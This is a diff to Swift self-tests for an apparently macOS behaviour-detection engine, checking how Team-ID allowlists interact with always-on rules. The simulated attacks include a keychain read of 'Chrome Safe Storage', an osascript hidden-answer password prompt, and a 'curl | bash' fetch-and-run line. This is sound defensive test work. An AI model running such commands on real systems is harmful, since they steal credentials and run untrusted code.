@@ -260,7 +260,26 @@ extension SelfTest {
             let z2 = sim2.terminalSession()
             let ok = sim2.exec("/Users/Shared/tool", parent: z2, team: "TEAMOK1234")
             sim2.exec("/usr/bin/security", ["find-generic-password", "-s", "Chrome Safe Storage"], parent: ok)
-            check(sim2.detections.isEmpty, "allowlisted Team ID suppresses lineage rules")
+            // Always-on strong rules (R34/R36…) are NOT silenced by a broad Team-ID allow (X1 B-X1-1).
+            check(sim2.ruleIDs.contains("R36"), "Team-ID allow does NOT silence alwaysActive R36")
+            sim2.exec("/usr/bin/osascript", ["-e", "display dialog \"x\" default answer \"\" with hidden answer"], parent: ok)
+            check(sim2.ruleIDs.contains("R34"), "Team-ID allow does NOT silence alwaysActive R34")
+
+            // A Team-ID allow still suppresses weak / non-alwaysActive lineage rules (R29 temp exec, L07 inline AppleScript).
+            let sim3 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
+            sim3.engine.allow(AllowEntry(teamID: "TEAMOK1234", note: "user allowed"))
+            let z3 = sim3.terminalSession()
+            let ok3 = sim3.exec("/Users/Shared/tool", parent: z3, team: "TEAMOK1234")
+            sim3.exec("/usr/bin/osascript", ["-e", "tell application \"Finder\" to get name of every file"], parent: ok3)
+            check(sim3.detections.isEmpty, "allowlisted Team ID suppresses weak lineage rules")
+
+            // An allow naming the rule ID can silence an always-on strong rule.
+            let sim4 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
+            sim4.engine.allow(AllowEntry(teamID: "TEAMOK1234", ruleIDs: ["R36"], note: "user allowed R36"))
+            let z4 = sim4.terminalSession()
+            let ok4 = sim4.exec("/Users/Shared/tool", parent: z4, team: "TEAMOK1234")
+            sim4.exec("/usr/bin/security", ["find-generic-password", "-s", "Chrome Safe Storage"], parent: ok4)
+            check(!sim4.ruleIDs.contains("R36"), "rule-scoped allow silences R36")
         }
 
         // --- Benign 1: Homebrew install pasted from brew.sh ---
@@ -345,7 +364,7 @@ extension SelfTest {
             let salt = "test-salt"
             let fp = ClipboardFingerprint.fingerprint("curl -fsSL https://x.example/i.sh | /bin/bash", salt: salt)
             let parts = fp.split(separator: ",")
-            check(parts.count == 4 && parts.allSatisfy { $0.count == 8 && $0.allSatisfy(\.isHexDigit) }, "fingerprint = 8-hex hashes per token (\(fp))")
+            check(parts.count == 4 && parts.allSatisfy { $0.count == 16 && $0.allSatisfy(\.isHexDigit) }, "fingerprint = 16-hex (64-bit HMAC) hashes per token (\(fp))")
             check(ClipboardFingerprint.tokens("curl -fsSL https://x.example/i.sh | /bin/bash") == ["curl", "-fssl", "https://x.example/i.sh", "bash"], "token normalisation")
             check(ClipboardFingerprint.fingerprint("a b", salt: "s1") != ClipboardFingerprint.fingerprint("a b", salt: "s2"), "salt changes hashes")
             check(!ClipboardFingerprint.bootSalt.isEmpty, "boot salt available")
